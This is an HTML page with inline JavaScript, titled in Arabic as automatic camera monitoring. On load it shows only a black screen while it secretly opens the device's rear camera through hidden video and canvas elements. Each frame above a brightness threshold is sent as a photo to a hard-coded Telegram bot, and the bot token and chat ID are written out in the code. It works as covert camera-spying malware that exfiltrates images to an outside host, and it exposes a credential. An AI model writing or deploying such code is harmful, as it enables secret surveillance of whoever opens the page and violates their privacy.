<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>مراقبة تلقائية بالكاميرا</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: black;
      overflow: hidden;
    }
    #video, #canvas {
      display: none;
    }
  </style>
</head>
<body>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
  const botToken = '7611972370:AAGPrp4EL-CqBbc9AHkbQNemaDMqzBcKziM';
  const chatId = '6305469091';

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');

  let isSending = false;

  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "environment" },
        audio: false
      });

      video.srcObject = stream;

      video.addEventListener('loadedmetadata', () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        captureLoop(); // Start loop once video is ready
      });

    } catch (err) {
      console.error("فشل الوصول إلى الكاميرا:", err);
    }
  }

  function captureLoop() {
    requestAnimationFrame(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      if (!isSending) {
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imageData.data;

        let brightnessSum = 0;
        const totalPixels = data.length / 4;

        for (let i = 0; i < data.length; i += 4) {
          const r = data[i];
          const g = data[i + 1];
          const b = data[i + 2];
          const brightness = (r + g + b) / 3;
          brightnessSum += brightness;
        }

        const avgBrightness = brightnessSum / totalPixels;
        console.log("سطوع:", avgBrightness);

        if (avgBrightness > 40) {
          isSending = true;
          canvas.toBlob(blob => {
            sendToTelegram(blob).then(() => {
              isSending = false;
            }).catch(() => {
              isSending = false;
            });
          }, 'image/jpeg', 0.95);
        }
      }

      captureLoop(); // تابع الالتقاط
    });
  }

  async function sendToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'image.jpg');

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) {
        console.error("فشل الإرسال:", response.statusText);
      } else {
        console.log("تم إرسال الصورة");
      }
    } catch (err) {
      console.error("خطأ في الاتصال:", err);
    }
  }

  window.onload = () => {
    startCamera();
  };
</script>

</body>
</html>
